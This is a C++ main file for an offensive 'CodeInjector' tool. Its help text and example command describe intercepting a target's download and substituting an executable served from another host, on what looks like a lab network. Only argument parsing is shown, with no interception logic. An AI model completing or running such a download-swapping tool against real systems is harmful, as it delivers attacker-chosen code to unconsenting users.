#include "CodeInjector.h"

#include <iostream>

#include <arpa/inet.h> 
#include <netinet/ip.h>
#include <net/if.h>
#include <netinet/in.h>
#include <unistd.h>


void PrintHelp(char** argv)
{
    std::cout
        << "To use the program, provide the arguments in the following format:\n"
        << argv[0] << " <interface name> <ip version> <queueNum> <target ip> <download link> <new download link>\n\n"
        << "<interface name>: the interface you wish to use.\n"
        << "<ip version>: ip version of the target, must be 4 or 6\n"
        << "<queueNum>: nft queue number used to capture packets\n"
        << "<target ip>: target whose file you wish to intercept\n"
        << "<download link>: file you wish to replace\n"
        << "<new download link>: the path to the file you want the target to download\n\n"
        << "Example: " << argv[0] << " eth0 "<< "4 " << "10.0.2.4 " << " 0 " << " download.example.co/testfile.exe " << "10.0.2.15/test_program.exe" << std::endl;
}

// TODO: improve args processing
int ProcessArgs(int argc, char** argv, char* interfaceName, uint32_t& ipVersion, uint32_t& queueNum, char* targetIP)
{
    if((argc == 2) && (PacketCraft::CompareStr(argv[1], "?") == TRUE))
    {
        PrintHelp(argv);
        exit(EXIT_SUCCESS);
    }

    if(argc != 7)
        return APPLICATION_ERROR;

    if(PacketCraft::GetStrLen(argv[1]) > IFNAMSIZ)
        return APPLICATION_ERROR;

    PacketCraft::CopyStr(interfaceName, IFNAMSIZ, argv[1]);

    if(PacketCraft::CompareStr(argv[2], "4") == TRUE)
        ipVersion = AF_INET;
    else if(PacketCraft::CompareStr(argv[2], "6") == TRUE)
        ipVersion = AF_INET6;
    else
        return APPLICATION_ERROR;

    queueNum = atoi(argv[3]);

    PacketCraft::CopyStr(targetIP, INET6_ADDRSTRLEN, argv[4]);

    return NO_ERROR;
}

int main(int argc, char** argv)
{
    char interfaceName[IFNAMSIZ]{};
    uint32_t ipVersion{};
    uint32_t queueNum{};
    char targetIPStr[INET6_ADDRSTRLEN]{};

    if(ProcessArgs(argc, argv, interfaceName, ipVersion, queueNum, targetIPStr) == APPLICATION_ERROR)
    {
        LOG_ERROR(APPLICATION_ERROR, "ProcessArgs() error!");
        PrintHelp(argv);
        return APPLICATION_ERROR;
    }

    std::cout << std::flush;
    return NO_ERROR;    
}